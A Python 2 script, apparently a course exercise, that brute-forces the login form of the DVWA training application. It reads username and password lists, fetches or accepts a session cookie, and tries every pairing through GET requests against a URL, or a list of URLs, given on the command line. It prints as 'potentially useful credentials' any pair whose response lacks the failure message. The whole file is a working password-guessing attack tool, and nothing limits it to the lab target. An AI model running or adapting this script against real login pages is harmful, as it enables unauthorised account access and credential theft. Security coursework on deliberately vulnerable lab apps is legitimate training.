__author__ = 'liteman'
'''
Kevin Romano
CFRS767
Brute-force exercise in DVWA
'''

import os
import sys
import requests
import argparse
import re

def list_all_items(path):
    """
    Take the path to a file, or a single item
    @param path: if it is a path, read the file and return a list of values,
    if a string, return a list of one

    """

    retList = []
    if os.path.exists(path):
        f = open(path, 'r')
        for item in f.readlines():
            item = item.strip()
            if item == '':
                continue
            retList.append(item.strip())
        f.close()

        return retList

    else:
        retList.append(path)
    return retList

def getCookie(url, verbose=False):
    """
    Make an initial request to the specified URL and capture the assigned cookie
    :return: string containing the established cookie
    """
    if verbose:
        print "DEBUG: Retrieving cookie"

    initreq = requests.get(url)

    cookieStr = ""
    for key, value in initreq.cookies.items():
        cookieStr += key +"="+value + "; "

    if verbose:
        print "DEBUG: getCookie() Result: " + cookieStr[:-2]

    return initreq.cookies

def runBruteForce(url, users, pws, cookie, verbose=False):
    """

    :param url: URL to login page
    :param users:  list of users to try
    :param pws: list of passwords to try
    :param verbose: False by default. If true, display debug strings
    :return: list of successful user/pw combinations
    """

    print "[+] Starting brute force"
    print "\tAttacking URL: " + url

    #Sample unsuccessful: <br>Username and/or password incorrect.
    repattern = "Username and/or password incorrect."

    #loop through users and passwords.
    #outer loop: passwords -- for each password try multiple users
    #inner loop: users
    validcreds = {}  # Store results in a dictionary - key: username, value: password
    for pw in pws:
        for user in users:
            datad = {"username": user, "password": pw, "Login": "Login"}
            attempt = requests.get(url, params=datad, cookies=cookie)
            matches = re.search(repattern, attempt.text)  # Look for the "bad username" pattern
            if matches:
                if verbose:
                    print "DEBUG: User: " + user + " Pass: " + pw + " -- Invalid"
                continue
            else:
                if verbose:
                    print "DEBUG: User: " + user + " Pass: " + pw + " -- Valid"
                validcreds[user] = pw

    #Display results
    print "[+] Brute force complete"
    print "\tPotentially useful credentials"
    for user, pw in validcreds.items():
        print "\t" + user + "/" + pw

def formatCookie(cookieStr):
    """
    Takes a string of cookie data and puts it into a dictionary format that Requests will understand
    :param cookieStr:
    :return: dict of cookie data
    """

    crumbs = cookieStr.split()
    cookiedict = {}
    for item in crumbs:
        item = item.strip(';')
        tmp = item.split('=')
        cookiedict[tmp[0]] = tmp[1]

    return cookiedict

def begin(args):
    """
    Function that will control the flow of the program
    :param args: command-line arguments
    :return: None
    """
    if args.verbose:
        print "DEBUG: Begin processing..."

    if not os.path.exists(args.names):
        print "Error: Unable to find specified names list: " + args.names
        print "Exiting.."
        sys.exit(1)

    if not os.path.exists(args.passwords):
        print "Error: Unable to find specified password list: " + args.passwords
        print "Exiting.."
        sys.exit(1)

    urlList = list_all_items(args.url)

    for url in urlList:
        if args.verbose:
            print "\nDEBUG: Starting on " + url

        if not args.cookie:
            cookiedict = getCookie(url, args.verbose)
        else:
            cookiedict = formatCookie(args.cookie)

        if args.verbose:
            print "DEBUG: Cookie set: " + str(cookiedict)

        runBruteForce(url, list_all_items(args.names), list_all_items(args.passwords), cookiedict, args.verbose)


def main():

    parser = argparse.ArgumentParser(description="Brute force Login Page", add_help=True)

    parser.add_argument('-v', '--verbose',
                        help="Include additional debug output",
                        action='store_true',
                        required=False)
    parser.add_argument('-u', '--url',
                        help="URL (or path to url list) to the login page you wish to attack",
                        metavar="URL or PATH",
                        required=True)
    parser.add_argument('-n', '--names',
                        help="Path to a text file containing usernames",
                        metavar="PATH",
                        required=True)
    parser.add_argument('-p', '--passwords',
                        help="Path to a text file containing passwords",
                        metavar="PATH",
                        required=True)
    parser.add_argument('-c', '--cookie',
                        help="Cookie to use in the HTTP headers",
                        metavar="<string>",
                        required=False)

    args = parser.parse_args()

    if args.verbose:
        print "Debugging on."

    begin(args)


main()